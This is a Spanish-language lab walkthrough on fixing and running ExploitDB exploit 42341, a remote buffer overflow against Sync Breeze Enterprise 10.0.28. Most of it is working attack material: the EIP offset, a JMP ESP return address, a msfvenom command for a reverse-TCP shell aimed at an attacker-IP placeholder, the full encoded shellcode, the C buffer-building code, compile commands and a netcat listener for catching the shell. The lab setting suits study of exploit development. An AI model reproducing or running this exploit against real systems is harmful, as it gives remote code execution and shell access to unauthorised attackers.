# Walk: Fixing Buffer Overflow

## Fecha: 11/02/2025
## Host: Windows
## IP: 192.168.182.10
## Objetivo
Comprender el proceso de reparacion e implementacion del exploit **42341** 
## Herramientas
1. tool - 1
2. tool - 2
## Procedimiento y comandos
>La "Formula" del exploit es la siguiente
```
offset = "A" * 780
JMP_ESP = "\x83\x0c\x09\x10"
shellcode = "\x90"*16 + msf_shellcode
exploit = offset + JMP_ESP + shellcode
```
#### Paso 1:  Entendimiento del exploit y el entorno de destino
1. Luego de correr el comando _**"mirror"**_  `searchsploit -m 42341`  analizamos la copia, y notamos que este se ejecutara en un entorno de destino  _**windows**_
```
#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
```
2. 

#### Paso 2: Compilacion Cursada del exploit
1. Para compilar el codigo desde Kali debemos ejecutar con la siguiente herramienta:
- `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
>Con la opción -l, podemos indicarle a mingw-w64 que busque la DLL ws2_32 y la incluya en el ejecutable final mediante un enlace estátic
2. Esto Produce un archivo ejecutable `syncbreeze_exploit.exe` 

#### Paso 3: Correccion del exploit
1. El primer aspecto a corregir del exploit es la _**direccion de retorno**_ : En el exploit notamos que el valor de esta es: 
```c
unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll
```
2. Verificamos una _**direccion de retorno**_ valida:
- Iniciamos el servicio en la maquina victima:  **Sync Breeze Enterprise 10.0.28**
- Abrimos Immunity Debugger como administrador  _**File > Attach**_ 
- Seleccionamos _**syncbrs**_ 
- Click en _**Attach**_
- Click _**View > Executable modules**_ y verificamos que `msvbvm60.dll` no se encuentra como direccion de retorno. 
3. Ajustamos el exploit _**.c**_ con el _**.py**_ de expoitDB que esta verificado.
- `unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83`
>Si no tenemos una dirección de retorno de un exploit desarrollado previamente, tenemos algunas opciones para considerar. La primera opción, y la más recomendada, es recrear el entorno de destino localmente y usar un depurador para determinar esta dirección.
Si esta no es una opción, podríamos usar información de otros exploits disponibles públicamente para encontrar una dirección de retorno confiable que coincida con nuestro entorno de destino.
4. Pasamos a corregir el payload _**shellcode**_:
- Creamos nuestro propio payload con `msfvenom`
```
msfvenom -p windows/shell_reverse_tcp LHOST=IP_ATACANTE LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
- Dejamos esta linea:
`"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE`
- Copiamos el resultado del comando con msfvenom:
```
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x09\x8f\x85\x9f\x83\xee\xfc\xe2\xf4\xf5\x67\x07\x9f"
"\x09\x8f\xe5\x16\xec\xbe\x45\xfb\x82\xdf\xb5\x14\x5b\x83"
"\x0e\xcd\x1d\x04\xf7\xb7\x06\x38\xcf\xb9\x38\x70\x29\xa3"
"\x68\xf3\x87\xb3\x29\x4e\x4a\x92\x08\x48\x67\x6d\x5b\xd8"
"\x0e\xcd\x19\x04\xcf\xa3\x82\xc3\x94\xe7\xea\xc7\x84\x4e"
"\x58\x04\xdc\xbf\x08\x5c\x0e\xd6\x11\x6c\xbf\xd6\x82\xbb"
"\x0e\x9e\xdf\xbe\x7a\x33\xc8\x40\x88\x9e\xce\xb7\x65\xea"
"\xff\x8c\xf8\x67\x32\xf2\xa1\xea\xed\xd7\x0e\xc7\x2d\x8e"
"\x56\xf9\x82\x83\xce\x14\x51\x93\x84\x4c\x82\x8b\x0e\x9e"
"\xd9\x06\xc1\xbb\x2d\xd4\xde\xfe\x50\xd5\xd4\x60\xe9\xd0"
"\xda\xc5\x82\x9d\x6e\x12\x54\xe7\xb6\xad\x09\x8f\xed\xe8"
"\x7a\xbd\xda\xcb\x61\xc3\xf2\xb9\x0e\x70\x50\x27\x99\x8e"
"\x85\x9f\x20\x4b\xd1\xcf\x61\xa6\x05\xf4\x09\x70\x50\xcf"
"\x59\xdf\xd5\xdf\x59\xcf\xd5\xf7\xe3\x80\x5a\x7f\xf6\x5a"
"\x12\xf5\x0c\xe7\x45\x37\x24\x32\xed\x9d\x09\x8e\x3e\x16"
"\xef\xe5\x95\xc9\x5e\xe7\x1c\x3a\x7d\xee\x7a\x4a\x8c\x4f"
"\xf1\x93\xf6\xc1\x8d\xea\xe5\xe7\x75\x2a\xab\xd9\x7a\x4a"
"\x61\xec\xe8\xfb\x09\x06\x66\xc8\x5e\xd8\xb4\x69\x63\x9d"
"\xdc\xc9\xeb\x72\xe3\x58\x4d\xab\xb9\x9e\x08\x02\xc1\xbb"
"\x19\x49\x85\xdb\x5d\xdf\xd3\xc9\x5f\xc9\xd3\xd1\x5f\xd9"
"\xd6\xc9\x61\xf6\x49\xa0\x8f\x70\x50\x16\xe9\xc1\xd3\xd9"
"\xf6\xbf\xed\x97\x8e\x92\xe5\x60\xdc\x34\x65\x82\x23\x85"
"\xed\x39\x9c\x32\x18\x60\xdc\xb3\x83\xe3\x03\x0f\x7e\x7f"
"\x7c\x8a\x3e\xd8\x1a\xfd\xea\xf5\x09\xdc\x7a\x4a";
```
- Todo junto queda:
```
unsigned char shellcode[] =
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
        "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
        "\x0e\x09\x8f\x85\x9f\x83\xee\xfc\xe2\xf4\xf5\x67\x07\x9f"
        "\x09\x8f\xe5\x16\xec\xbe\x45\xfb\x82\xdf\xb5\x14\x5b\x83"
        "\x0e\xcd\x1d\x04\xf7\xb7\x06\x38\xcf\xb9\x38\x70\x29\xa3"
        "\x68\xf3\x87\xb3\x29\x4e\x4a\x92\x08\x48\x67\x6d\x5b\xd8"
        "\x0e\xcd\x19\x04\xcf\xa3\x82\xc3\x94\xe7\xea\xc7\x84\x4e"
        "\x58\x04\xdc\xbf\x08\x5c\x0e\xd6\x11\x6c\xbf\xd6\x82\xbb"
        "\x0e\x9e\xdf\xbe\x7a\x33\xc8\x40\x88\x9e\xce\xb7\x65\xea"
        "\xff\x8c\xf8\x67\x32\xf2\xa1\xea\xed\xd7\x0e\xc7\x2d\x8e"
        "\x56\xf9\x82\x83\xce\x14\x51\x93\x84\x4c\x82\x8b\x0e\x9e"
        "\xd9\x06\xc1\xbb\x2d\xd4\xde\xfe\x50\xd5\xd4\x60\xe9\xd0"
        "\xda\xc5\x82\x9d\x6e\x12\x54\xe7\xb6\xad\x09\x8f\xed\xe8"
        "\x7a\xbd\xda\xcb\x61\xc3\xf2\xb9\x0e\x70\x50\x27\x99\x8e"
        "\x85\x9f\x20\x4b\xd1\xcf\x61\xa6\x05\xf4\x09\x70\x50\xcf"
        "\x59\xdf\xd5\xdf\x59\xcf\xd5\xf7\xe3\x80\x5a\x7f\xf6\x5a"
        "\x12\xf5\x0c\xe7\x45\x37\x24\x32\xed\x9d\x09\x8e\x3e\x16"
        "\xef\xe5\x95\xc9\x5e\xe7\x1c\x3a\x7d\xee\x7a\x4a\x8c\x4f"
        "\xf1\x93\xf6\xc1\x8d\xea\xe5\xe7\x75\x2a\xab\xd9\x7a\x4a"
        "\x61\xec\xe8\xfb\x09\x06\x66\xc8\x5e\xd8\xb4\x69\x63\x9d"
        "\xdc\xc9\xeb\x72\xe3\x58\x4d\xab\xb9\x9e\x08\x02\xc1\xbb"
        "\x19\x49\x85\xdb\x5d\xdf\xd3\xc9\x5f\xc9\xd3\xd1\x5f\xd9"
        "\xd6\xc9\x61\xf6\x49\xa0\x8f\x70\x50\x16\xe9\xc1\xd3\xd9"
        "\xf6\xbf\xed\x97\x8e\x92\xe5\x60\xdc\x34\x65\x82\x23\x85"
        "\xed\x39\x9c\x32\x18\x60\xdc\xb3\x83\xe3\x03\x0f\x7e\x7f"
        "\x7c\x8a\x3e\xd8\x1a\xfd\xea\xf5\x09\xdc\x7a\x4a";
```
5. Corregimos las IP_DESTINO que encontremos en el exploit:
- `server.sin_addr.s_addr = inet_addr("IP_DESTINO");`
- `"Host: IP_DESTINO\r\n"`

#### Paso 4: Ajuste del Buffer
1. Identificar el Desplazamiento Correcto del EIP:
-   El desplazamiento para sobrescribir el EIP es **780 bytes**.
-   Se utiliza `malloc` para crear el búfer de relleno:
```
int initial_buffer_size = 780; 
char *padding = malloc(initial_buffer_size);
```
2.  Llenar el Búfer con "A" (0x41):
-   Se usa `memset` para llenar el búfer con el carácter "A"
- `memset(padding, 0x41, initial_buffer_size);`
3. Agregar un Byte NULL al Final:
-   El último byte se establece en NULL (`0x00`) para terminar la cadena:
- `memset(padding + initial_buffer_size - 1, 0x00, 1);`
**Problema:** Esto convierte la cadena en **779 bytes** útiles en lugar de **780**, causando una desalineación al sobrescribir el EIP.
4. Corrección de la Desalineación:
-   Aumentar el tamaño del búfer en 1 byte:
```
int initial_buffer_size = 781;
char *padding = malloc(initial_buffer_size);
memset(padding, 0x41, initial_buffer_size);
memset(padding + initial_buffer_size - 1, 0x00, 1);
```
5. Construcción del Búfer Final:
    Se crea un búfer final que concatena las partes de la solicitud y el payload:
```
char *buffer = malloc(buffer_length);
memset(buffer, 0x00, buffer_length);
strcpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);    // Aquí va el relleno corregido
strcat(buffer, retn);       // Dirección de retorno
strcat(buffer, shellcode);  // Shellcode
strcat(buffer, request_three);
```
#### Paso 5: Compilar y ejecutar el Exploit:
>  Compilar el exploit para Windows:
- `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
> Preparar el receptor Netcat:
-  `sudo nc -lvp 443`
 > Ejecutar el exploit usando `wine`:
 - `wine syncbreeze_exploit.exe`
Si todo marcha bien, obtenemos el shell
